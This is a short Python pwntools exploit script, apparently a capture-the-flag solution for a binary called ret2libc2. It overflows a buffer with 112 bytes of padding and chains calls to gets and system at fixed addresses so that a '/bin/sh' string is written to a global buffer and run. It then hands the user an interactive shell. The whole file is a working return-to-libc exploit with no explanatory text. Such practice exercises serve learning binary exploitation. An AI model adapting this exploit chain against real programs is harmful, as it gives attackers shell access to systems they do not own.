from pwn import *
p=process('./ret2libc2')
get_add=0x08048460
sys_add=0x08048490
buf2_add=0x0804A080
payload=flat([b'A'*112,get_add,sys_add,buf2_add,buf2_add])
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()